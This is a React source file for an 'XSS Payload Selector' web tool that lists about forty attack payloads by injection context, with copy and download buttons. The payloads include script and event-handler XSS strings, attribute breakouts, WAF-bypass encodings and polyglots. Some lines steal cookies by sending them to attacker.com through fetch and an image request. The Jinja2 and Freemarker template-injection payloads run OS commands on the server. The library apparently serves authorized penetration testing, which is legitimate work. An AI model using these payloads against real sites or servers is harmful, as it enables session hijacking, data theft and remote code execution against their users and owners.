import { useMemo, useState } from 'react';
import { BackLink } from '../../components/BackLink';
import { AlertTriangle, Copy, Download, Filter, Info, Search, Shield, Tag } from 'lucide-react';

/**
 * /dfir/xss-payloads — XSS payload selector by context.
 *
 * Curated payload library organized by injection context, with filtering,
 * encoding helpers, and one-click copy. All logic runs in-browser.
 */

type PayloadContext =
  | 'all'
  | 'html-tag'
  | 'html-attr'
  | 'javascript'
  | 'css'
  | 'svg'
  | 'event-handler'
  | 'encoded'
  | 'polyglot'
  | 'template';

type Severity = 'low' | 'medium' | 'high' | 'critical';

interface Payload {
  id: string;
  name: string;
  payload: string;
  context: PayloadContext;
  severity: Severity;
  description: string;
  bypasses?: string[];
  tags?: string[];
}

const CONTEXTS: { id: PayloadContext; label: string }[] = [
  { id: 'all', label: 'All' },
  { id: 'html-tag', label: 'HTML Tag' },
  { id: 'html-attr', label: 'HTML Attribute' },
  { id: 'javascript', label: 'JavaScript' },
  { id: 'css', label: 'CSS' },
  { id: 'svg', label: 'SVG' },
  { id: 'event-handler', label: 'Event Handler' },
  { id: 'encoded', label: 'Encoded' },
  { id: 'polyglot', label: 'Polyglot' },
  { id: 'template', label: 'Template' },
];

const SEVERITY_COLORS: Record<Severity, string> = {
  low: 'bg-emerald-500/15 text-emerald-700 dark:text-emerald-300',
  medium: 'bg-amber-500/15 text-amber-700 dark:text-amber-300',
  high: 'bg-orange-500/15 text-orange-700 dark:text-orange-300',
  critical: 'bg-rose-500/15 text-rose-700 dark:text-rose-300',
};

const PAYLOADS: Payload[] = [
  // HTML Tag
  {
    id: 'ht-1',
    name: 'Basic script tag',
    payload: '<script>alert(1)</script>',
    context: 'html-tag',
    severity: 'critical',
    description: 'Classic XSS via script tag injection',
    bypasses: [],
    tags: ['classic', 'basic'],
  },
  {
    id: 'ht-2',
    name: 'IMG onerror',
    payload: '<img src=x onerror=alert(1)>',
    context: 'html-tag',
    severity: 'critical',
    description: 'Image tag with onerror handler — triggers when src fails to load',
    tags: ['event-handler'],
  },
  {
    id: 'ht-3',
    name: 'SVG onload',
    payload: '<svg onload=alert(1)>',
    context: 'html-tag',
    severity: 'critical',
    description: 'SVG element with onload event',
    tags: ['svg', 'event-handler'],
  },
  {
    id: 'ht-4',
    name: 'Body onload',
    payload: '<body onload=alert(1)>',
    context: 'html-tag',
    severity: 'high',
    description: 'Body element onload event',
    tags: ['event-handler'],
  },
  {
    id: 'ht-5',
    name: 'Iframe srcdoc',
    payload: '<iframe srcdoc="<script>alert(1)</script>">',
    context: 'html-tag',
    severity: 'critical',
    description: 'Iframe with srcdoc attribute for nested XSS',
    tags: ['iframe'],
  },
  {
    id: 'ht-6',
    name: 'Details ontoggle',
    payload: '<details open ontoggle=alert(1)>',
    context: 'html-tag',
    severity: 'high',
    description: 'HTML5 details element with ontoggle event',
    tags: ['html5'],
  },
  {
    id: 'ht-7',
    name: 'Marquee onstart',
    payload: '<marquee onstart=alert(1)>',
    context: 'html-tag',
    severity: 'medium',
    description: 'Deprecated marquee element — may bypass strict filters',
    bypasses: ['WAF', 'input filter'],
    tags: ['deprecated'],
  },
  {
    id: 'ht-8',
    name: 'Video onerror',
    payload: '<video src=x onerror=alert(1)>',
    context: 'html-tag',
    severity: 'high',
    description: 'Video element with onerror fallback',
    tags: ['media'],
  },

  // HTML Attribute
  {
    id: 'ha-1',
    name: 'Onfocus autofocus',
    payload: '" onfocus=alert(1) autofocus="',
    context: 'html-attr',
    severity: 'critical',
    description: 'Break out of attribute and inject onfocus with autofocus',
    tags: ['attribute-breakout'],
  },
  {
    id: 'ha-2',
    name: 'Onmouseover',
    payload: '" onmouseover=alert(1) "',
    context: 'html-attr',
    severity: 'high',
    description: 'Attribute breakout with mouseover event',
    tags: ['attribute-breakout'],
  },
  {
    id: 'ha-3',
    name: 'Onerror attribute',
    payload: '" onerror=alert(1) "',
    context: 'html-attr',
    severity: 'high',
    description: 'Attribute breakout with onerror for img/svg injection',
    tags: ['attribute-breakout'],
  },
  {
    id: 'ha-4',
    name: 'Onload attribute',
    payload: '" onload=alert(1) "',
    context: 'html-attr',
    severity: 'high',
    description: 'Attribute breakout with onload event',
    tags: ['attribute-breakout'],
  },

  // JavaScript
  {
    id: 'js-1',
    name: 'Alert',
    payload: 'alert(1)',
    context: 'javascript',
    severity: 'critical',
    description: 'Basic alert() for XSS confirmation',
    tags: ['classic'],
  },
  {
    id: 'js-2',
    name: 'Confirm',
    payload: 'confirm(1)',
    context: 'javascript',
    severity: 'critical',
    description: 'Confirm dialog — requires user interaction to dismiss',
    tags: ['classic'],
  },
  {
    id: 'js-3',
    name: 'Prompt',
    payload: 'prompt(1)',
    context: 'javascript',
    severity: 'critical',
    description: 'Prompt dialog — displays input field',
    tags: ['classic'],
  },
  {
    id: 'js-4',
    name: 'Document.cookie',
    payload: 'document.cookie',
    context: 'javascript',
    severity: 'critical',
    description: 'Access cookies — for cookie theft PoCs',
    tags: ['exfil'],
  },
  {
    id: 'js-5',
    name: 'Fetch exfil',
    payload: "fetch('https://attacker.com/?c='+document.cookie)",
    context: 'javascript',
    severity: 'critical',
    description: 'Exfiltrate cookies via fetch request',
    tags: ['exfil', 'network'],
  },
  {
    id: 'js-6',
    name: 'Image exfil',
    payload: "new Image().src='https://attacker.com/?c='+document.cookie",
    context: 'javascript',
    severity: 'critical',
    description: 'Exfiltrate cookies via image pixel',
    bypasses: ['Content-Security-Policy'],
    tags: ['exfil', 'csp-bypass'],
  },
  {
    id: 'js-7',
    name: 'Eval injection',
    payload: "eval(atob('YWxlcnQoMSk='))",
    context: 'javascript',
    severity: 'critical',
    description: 'Base64-encoded payload via eval()',
    bypasses: ['WAF'],
    tags: ['encoded', 'waf-bypass'],
  },
  {
    id: 'js-8',
    name: 'Constructor override',
    payload: 'constructor.constructor("alert(1)")()',
    context: 'javascript',
    severity: 'high',
    description: 'Access Function constructor for dynamic code execution',
    tags: ['prototype'],
  },

  // CSS
  {
    id: 'css-1',
    name: 'CSS expression (IE)',
    payload: 'expression(alert(1))',
    context: 'css',
    severity: 'medium',
    description: 'IE-specific CSS expression — legacy but bypasses some filters',
    bypasses: ['IE-specific'],
    tags: ['legacy', 'ie'],
  },
  {
    id: 'css-2',
    name: 'CSS url exfil',
    payload: "background:url('https://attacker.com/?data=')",
    context: 'css',
    severity: 'medium',
    description: 'Data exfiltration via CSS url() loading',
    tags: ['exfil'],
  },

  // SVG
  {
    id: 'svg-1',
    name: 'SVG script',
    payload: '<svg><script>alert(1)</script></svg>',
    context: 'svg',
    severity: 'critical',
    description: 'Script inside SVG element',
    tags: ['classic'],
  },
  {
    id: 'svg-2',
    name: 'SVG onload',
    payload: '<svg/onload=alert(1)>',
    context: 'svg',
    severity: 'critical',
    description: 'Shorthand SVG with onload',
    tags: ['event-handler'],
  },
  {
    id: 'svg-3',
    name: 'SVG animate',
    payload: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    context: 'svg',
    severity: 'high',
    description: 'SVG animate element with onbegin event',
    tags: ['animation'],
  },
  {
    id: 'svg-4',
    name: 'SVG set',
    payload: '<svg><set onbegin=alert(1) attributeName=x to=1>',
    context: 'svg',
    severity: 'high',
    description: 'SVG set element with onbegin event',
    tags: ['animation'],
  },

  // Event Handler
  {
    id: 'eh-1',
    name: 'onclick',
    payload: 'onclick=alert(1)',
    context: 'event-handler',
    severity: 'high',
    description: 'Click-triggered XSS',
    tags: ['click'],
  },
  {
    id: 'eh-2',
    name: 'onfocus',
    payload: 'onfocus=alert(1) autofocus',
    context: 'event-handler',
    severity: 'critical',
    description: 'Focus-triggered XSS with autofocus',
    tags: ['focus'],
  },
  {
    id: 'eh-3',
    name: 'oninput',
    payload: 'oninput=alert(1) autofocus',
    context: 'event-handler',
    severity: 'high',
    description: 'Input-triggered XSS',
    tags: ['input'],
  },
  {
    id: 'eh-4',
    name: 'onanimationend',
    payload: 'onanimationend=alert(1)',
    context: 'event-handler',
    severity: 'high',
    description: 'CSS animation end event — requires CSS injection',
    tags: ['animation'],
  },
  {
    id: 'eh-5',
    name: 'ontransitionend',
    payload: 'ontransitionend=alert(1)',
    context: 'event-handler',
    severity: 'medium',
    description: 'CSS transition end event',
    tags: ['animation'],
  },

  // Encoded
  {
    id: 'enc-1',
    name: 'HTML entity',
    payload: '&#60;script&#62;alert(1)&#60;/script&#62;',
    context: 'encoded',
    severity: 'critical',
    description: 'Decimal HTML entities for <script> tags',
    bypasses: ['HTML entity decoding'],
    tags: ['entity'],
  },
  {
    id: 'enc-2',
    name: 'Hex entity',
    payload: '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
    context: 'encoded',
    severity: 'critical',
    description: 'Hex HTML entities',
    bypasses: ['HTML entity decoding'],
    tags: ['entity'],
  },
  {
    id: 'enc-3',
    name: 'URL encode',
    payload: '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
    context: 'encoded',
    severity: 'critical',
    description: 'URL-encoded script tag',
    bypasses: ['URL decoding'],
    tags: ['url-encode'],
  },
  {
    id: 'enc-4',
    name: 'Double URL encode',
    payload: '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
    context: 'encoded',
    severity: 'critical',
    description: 'Double URL encoding — bypasses single-decode filters',
    bypasses: ['WAF', 'single-decode filter'],
    tags: ['url-encode', 'waf-bypass'],
  },
  {
    id: 'enc-5',
    name: 'Unicode escape',
    payload: '\\u003cscript\\u003ealert(1)\\u003c\\u002fscript\\u003e',
    context: 'encoded',
    severity: 'critical',
    description: 'Unicode escape sequences',
    bypasses: ['Unicode-aware filters'],
    tags: ['unicode'],
  },
  {
    id: 'enc-6',
    name: 'Base64',
    payload: "atob('PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==')",
    context: 'encoded',
    severity: 'critical',
    description: 'Base64-encoded script tag',
    bypasses: ['WAF'],
    tags: ['base64', 'waf-bypass'],
  },

  // Polyglot
  {
    id: 'poly-1',
    name: 'Polyglot payload',
    payload: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//',
    context: 'polyglot',
    severity: 'critical',
    description: 'Works across HTML, JS, and attribute contexts',
    tags: ['universal'],
  },
  {
    id: 'poly-2',
    name: 'Polyglot 2',
    payload: '"><img src=x onerror=alert(1)//',
    context: 'polyglot',
    severity: 'critical',
    description: 'Breaks out of HTML attribute and injects image tag',
    tags: ['universal'],
  },
  {
    id: 'poly-3',
    name: 'Polyglot 3',
    payload: "';alert(1)//",
    context: 'polyglot',
    severity: 'critical',
    description: 'Breaks out of JavaScript string context',
    tags: ['universal'],
  },

  // Template
  {
    id: 'tpl-1',
    name: 'Angular template',
    payload: '{{constructor.constructor("alert(1)")()}}',
    context: 'template',
    severity: 'critical',
    description: 'Angular template injection — SSTI',
    bypasses: ['Angular sandbox'],
    tags: ['angular', 'ssti'],
  },
  {
    id: 'tpl-2',
    name: 'Vue template',
    payload: '{{constructor.constructor("alert(1)")()}}',
    context: 'template',
    severity: 'critical',
    description: 'Vue.js template injection',
    tags: ['vue', 'ssti'],
  },
  {
    id: 'tpl-3',
    name: 'Jinja2 SSTI',
    payload: '{{config.__class__.__init__.__globals__["os"].popen("id").read()}}',
    context: 'template',
    severity: 'critical',
    description: 'Jinja2 server-side template injection',
    bypasses: ['Sandbox escape'],
    tags: ['jinja2', 'ssti', 'rce'],
  },
  {
    id: 'tpl-4',
    name: 'Freemarker SSTI',
    payload: '<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}',
    context: 'template',
    severity: 'critical',
    description: 'Freemarker template injection with RCE',
    tags: ['freemarker', 'ssti', 'rce'],
  },
];

export default function XssPayloadSelector(): JSX.Element {
  const [contextFilter, setContextFilter] = useState<PayloadContext>('all');
  const [searchQuery, setSearchQuery] = useState('');
  const [selectedPayloads, setSelectedPayloads] = useState<Set<string>>(new Set());
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const filtered = useMemo(() => {
    return PAYLOADS.filter((p) => {
      if (contextFilter !== 'all' && p.context !== contextFilter) return false;
      if (searchQuery) {
        const q = searchQuery.toLowerCase();
        return (
          p.name.toLowerCase().includes(q) ||
          p.payload.toLowerCase().includes(q) ||
          p.description.toLowerCase().includes(q) ||
          (p.tags ?? []).some((t) => t.toLowerCase().includes(q))
        );
      }
      return true;
    });
  }, [contextFilter, searchQuery]);

  const toggleSelect = (id: string) => {
    setSelectedPayloads((prev) => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id);
      else next.add(id);
      return next;
    });
  };

  const copyPayload = async (payload: string, id: string) => {
    try {
      await navigator.clipboard.writeText(payload);
      setCopiedId(id);
      setTimeout(() => setCopiedId(null), 1500);
    } catch {
      // fallback
    }
  };

  const copySelected = async () => {
    const selected = filtered.filter((p) => selectedPayloads.has(p.id));
    const text = selected.map((p) => p.payload).join('\n');
    try {
      await navigator.clipboard.writeText(text);
      setCopiedId('selected');
      setTimeout(() => setCopiedId(null), 1500);
    } catch {
      // fallback
    }
  };

  const downloadSelected = () => {
    const selected = filtered.filter((p) => selectedPayloads.has(p.id));
    const text = selected.map((p) => `// ${p.name} [${p.context}] [${p.severity}]\n${p.payload}`).join('\n\n');
    const blob = new Blob([text], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `xss-payloads-${Date.now()}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const stats = useMemo(() => {
    const byCtx: Record<string, number> = {};
    const bySev: Record<string, number> = {};
    for (const p of PAYLOADS) {
      byCtx[p.context] = (byCtx[p.context] ?? 0) + 1;
      bySev[p.severity] = (bySev[p.severity] ?? 0) + 1;
    }
    return { total: PAYLOADS.length, byCtx, bySev };
  }, []);

  return (
    <div className="max-w-6xl mx-auto px-4 py-8">
      <BackLink to="/dfir">Back to DFIR Catalog</BackLink>
      <div className="flex items-center gap-3 mt-4 mb-2">
        <div className="p-2 rounded-lg bg-purple-500/10 text-purple-600 dark:text-purple-400">
          <Shield size={24} />
        </div>
        <div>
          <h1 className="text-2xl font-bold">XSS Payload Selector</h1>
          <p className="text-sm text-slate-500 dark:text-slate-400">
            Curated XSS payload library — filter by context, severity, or tags
          </p>
        </div>
      </div>

      {/* Stats bar */}
      <div className="flex flex-wrap gap-2 mt-4 mb-4">
        <span className="px-2 py-1 rounded text-xs font-mono bg-slate-100 dark:bg-[rgb(var(--surface-200))]">
          {stats.total} payloads
        </span>
        <span className="px-2 py-1 rounded text-xs font-mono bg-rose-500/10 text-rose-600 dark:text-rose-400">
          {stats.bySev['critical'] ?? 0} critical
        </span>
        <span className="px-2 py-1 rounded text-xs font-mono bg-orange-500/10 text-orange-600 dark:text-orange-400">
          {stats.bySev['high'] ?? 0} high
        </span>
        <span className="px-2 py-1 rounded text-xs font-mono bg-amber-500/10 text-amber-600 dark:text-amber-400">
          {stats.bySev['medium'] ?? 0} medium
        </span>
        <span className="px-2 py-1 rounded text-xs font-mono bg-emerald-500/10 text-emerald-600 dark:text-emerald-400">
          {stats.bySev['low'] ?? 0} low
        </span>
      </div>

      {/* Filters */}
      <div className="flex flex-wrap items-center gap-3 mb-4">
        <div className="relative flex-1 min-w-[200px]">
          <Search size={14} className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-400" />
          <input
            type="text"
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            placeholder="Search payloads, tags, descriptions..."
            className="w-full pl-9 pr-3 py-2 rounded-lg border border-slate-200 dark:border-[rgb(var(--border-400))] bg-white dark:bg-[rgb(var(--surface-100))] text-sm font-mono"
          />
        </div>
        <div className="flex items-center gap-1">
          <Filter size={14} className="text-slate-400" />
          <div className="flex flex-wrap gap-1">
            {CONTEXTS.map((c) => (
              <button
                key={c.id}
                type="button"
                onClick={() => setContextFilter(c.id)}
                className={`px-2 py-1 rounded text-xs font-mono transition-colors ${
                  contextFilter === c.id
                    ? 'bg-purple-500/20 text-purple-700 dark:text-purple-300 border border-purple-500/30'
                    : 'bg-slate-100 dark:bg-[rgb(var(--surface-200))] text-slate-600 dark:text-slate-400 hover:bg-slate-200 dark:hover:bg-[rgb(var(--surface-300))]'
                }`}
              >
                {c.label}
                {c.id !== 'all' && <span className="ml-1 opacity-60">({stats.byCtx[c.id] ?? 0})</span>}
              </button>
            ))}
          </div>
        </div>
      </div>

      {/* Actions */}
      {selectedPayloads.size > 0 && (
        <div className="flex items-center gap-2 mb-3 p-2 rounded-lg bg-purple-50 dark:bg-purple-500/5 border border-purple-200 dark:border-purple-500/20">
          <Tag size={14} className="text-purple-500" />
          <span className="text-xs text-purple-700 dark:text-purple-300">{selectedPayloads.size} selected</span>
          <button
            type="button"
            onClick={copySelected}
            className="ml-auto text-xs px-2 py-1 rounded bg-purple-500/10 text-purple-600 dark:text-purple-400 hover:bg-purple-500/20"
          >
            {copiedId === 'selected' ? 'Copied!' : 'Copy Selected'}
          </button>
          <button
            type="button"
            onClick={downloadSelected}
            className="text-xs px-2 py-1 rounded bg-purple-500/10 text-purple-600 dark:text-purple-400 hover:bg-purple-500/20"
          >
            <Download size={12} className="inline mr-1" />
            Download
          </button>
          <button
            type="button"
            onClick={() => setSelectedPayloads(new Set())}
            className="text-xs px-2 py-1 rounded text-slate-500 hover:text-slate-700 dark:hover:text-slate-300"
          >
            Clear
          </button>
        </div>
      )}

      {/* Payload list */}
      <div className="space-y-2">
        {filtered.length === 0 ? (
          <div className="text-center py-12 text-slate-500 dark:text-slate-400">
            <AlertTriangle size={24} className="mx-auto mb-2 opacity-50" />
            <p className="text-sm">No payloads match your filters</p>
          </div>
        ) : (
          filtered.map((p) => (
            <div
              key={p.id}
              className={`rounded-xl border p-3 transition-colors ${
                selectedPayloads.has(p.id)
                  ? 'border-purple-500/50 bg-purple-50 dark:bg-purple-500/5'
                  : 'border-slate-200 dark:border-[rgb(var(--border-400))] bg-white dark:bg-[rgb(var(--surface-100))]'
              }`}
            >
              <div className="flex items-start gap-3">
                <input
                  type="checkbox"
                  checked={selectedPayloads.has(p.id)}
                  onChange={() => toggleSelect(p.id)}
                  className="mt-1 rounded"
                />
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2 flex-wrap">
                    <span className="text-sm font-semibold">{p.name}</span>
                    <span
                      className={`px-1.5 py-0.5 rounded text-[10px] font-mono uppercase ${SEVERITY_COLORS[p.severity]}`}
                    >
                      {p.severity}
                    </span>
                    <span className="px-1.5 py-0.5 rounded text-[10px] font-mono bg-slate-100 dark:bg-[rgb(var(--surface-200))] text-slate-600 dark:text-slate-400">
                      {p.context}
                    </span>
                  </div>
                  <p className="text-xs text-slate-500 dark:text-slate-400 mt-1">{p.description}</p>
                  <div className="mt-2 flex items-center gap-2">
                    <code className="flex-1 px-2 py-1.5 rounded bg-slate-900 text-slate-100 text-xs font-mono overflow-x-auto whitespace-nowrap">
                      {p.payload}
                    </code>
                    <button
                      type="button"
                      onClick={() => copyPayload(p.payload, p.id)}
                      className="shrink-0 p-1.5 rounded bg-slate-100 dark:bg-[rgb(var(--surface-200))] hover:bg-slate-200 dark:hover:bg-[rgb(var(--surface-300))]"
                      title="Copy payload"
                    >
                      <Copy size={12} />
                    </button>
                  </div>
                  {p.bypasses && p.bypasses.length > 0 && (
                    <div className="mt-1.5 flex flex-wrap gap-1">
                      {p.bypasses.map((b) => (
                        <span
                          key={b}
                          className="px-1.5 py-0.5 rounded text-[10px] bg-amber-500/10 text-amber-600 dark:text-amber-400"
                        >
                          bypasses: {b}
                        </span>
                      ))}
                    </div>
                  )}
                  {p.tags && p.tags.length > 0 && (
                    <div className="mt-1 flex flex-wrap gap-1">
                      {p.tags.map((t) => (
                        <span
                          key={t}
                          className="px-1.5 py-0.5 rounded text-[10px] bg-slate-100 dark:bg-[rgb(var(--surface-200))] text-slate-500 dark:text-slate-400"
                        >
                          #{t}
                        </span>
                      ))}
                    </div>
                  )}
                </div>
              </div>
            </div>
          ))
        )}
      </div>

      {/* Info */}
      <div className="mt-6 rounded-xl border border-slate-200 dark:border-[rgb(var(--border-400))] bg-slate-50 dark:bg-[rgb(var(--surface-200))] p-4">
        <h4 className="text-sm font-semibold mb-2 flex items-center gap-2">
          <Info size={14} className="text-slate-500" /> Usage Notes
        </h4>
        <ul className="text-xs text-slate-600 dark:text-slate-400 space-y-1 list-disc list-inside">
          <li>Select multiple payloads to copy/download in batch</li>
          <li>
            <strong>Context filters</strong> help narrow payloads to the exact injection point (HTML tag, attribute, JS,
            etc.)
          </li>
          <li>
            <strong>Polyglot payloads</strong> work across multiple contexts simultaneously
          </li>
          <li>
            <strong>Encoded payloads</strong> bypass WAFs and input filters that decode once
          </li>
          <li>
            <strong>Template payloads</strong> target server-side template injection (SSTI) in Jinja2, Angular, Vue,
            Freemarker
          </li>
          <li>Always obtain proper authorization before testing on live applications</li>
        </ul>
      </div>
    </div>
  );
}
